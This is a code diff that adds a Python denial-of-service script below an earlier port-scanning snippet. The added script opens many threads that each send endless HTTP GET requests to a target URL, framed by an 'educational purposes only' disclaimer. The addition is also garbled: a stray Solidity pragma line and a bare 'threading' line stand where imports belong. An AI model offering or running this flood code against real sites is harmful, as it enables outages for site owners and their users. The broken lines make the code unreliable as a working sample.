@@ -425,3 +425,35 @@ open_ports = scan_ports(host, ports)
 print("Open Ports:", open_ports)
 
 
+//. pragma Solidity 
+threading
+
+# Ethical Note: This code is for educational purposes only.
+# It demonstrates how a Denial-of-Service (DoS) attack might be structured.
+# Do not use this code to harm any system. Unauthorized attacks on systems are illegal.
+
+def send_request(url):
+    while True:
+        try:
+            response = requests.get(url)
+            print(f"Request sent to {url}, response status code: {response.status_code}")
+        except requests.exceptions.RequestException as e:
+            print(f"Request failed: {e}")
+
+def dos_attack(url, num_threads):
+    threads = []
+    for _ in range(num_threads):
+        thread = threading.Thread(target=send_request, args=(url,))
+        thread.daemon = True
+        threads.append(thread)
+        thread.start()
+
+    for thread in threads:
+        thread.join()
+
+# Example usage (for educational purposes only)
+if __name__ == "__main__":
+    target_url = "http://example.com"  # Replace with a test URL
+    num_threads = 50  # Number of threads to simulate multiple requests
+    dos_attack(target_url, num_threads)
+
